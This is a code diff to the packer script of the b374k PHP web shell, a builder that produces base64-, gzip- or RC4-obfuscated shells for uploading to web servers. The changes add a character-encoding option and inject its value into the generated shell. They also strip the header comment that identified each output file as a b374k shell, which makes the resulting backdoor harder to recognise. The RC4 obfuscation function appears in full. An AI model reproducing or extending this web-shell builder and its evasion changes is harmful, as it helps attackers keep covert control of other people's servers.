@@ -285,10 +285,11 @@ else{
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
 		$output .= "\t-k\t\t\t\t\tlist available themes\n";
+		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312..\n";
 
 	}
 	else{
-		$opt = getopt("o:p:t:m:sbz:c:lk");
+		$opt = getopt("o:p:t:m:sbz:c:lku:");
 
 		if(isset($opt['l'])){
 			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
@@ -326,6 +327,7 @@ else{
 
 		$strip = isset($opt['s'])? "yes":"no";
 		$base64 = isset($opt['b'])? "yes":"no";
+		$encode = isset($opt['u'])? addslashes($opt['u']):"utf-8";
 
 		$compress = isset($opt['z'])? trim($opt['z']):"no";
 		if(!in_array($compress, array('gzdeflate','gzencode','gzcompress','rc4','no'))){
@@ -357,6 +359,7 @@ else{
 		$output .= "Strip\t\t\t: ".$strip."\n";
 		$output .= "Base64\t\t\t: ".$base64."\n";
 		$output .= "RC4 Cipher Key\t\t: " . $GLOBALS['cipher_key'] . "\n";
+		$output .= "Code\t\t\t: " . $encode . "\n";
 		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
 		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";
 
@@ -383,7 +386,7 @@ else{
 
 		$htmlcode = trim($layout);
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
-		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
+		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
 		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
 		$status = explode("{[|b374k|]}", $res);
@@ -417,6 +420,7 @@ function packer_write_file($file, $content){
 			$zip->close();
 			return true;
 		}
+		fclose($fh);
 	}
 	return false;
 }
@@ -531,14 +535,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$version = $r[1];
 	}
 	
-	$header = "<?php
-/*
-	b374k shell ".$version."
-	Jayalah Indonesiaku
-	(c)".@date("Y",time())."
-	https://github.com/b374k/b374k
-
-*/\n";
+	$header = "<?php\n";
 	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}':'';
 
 
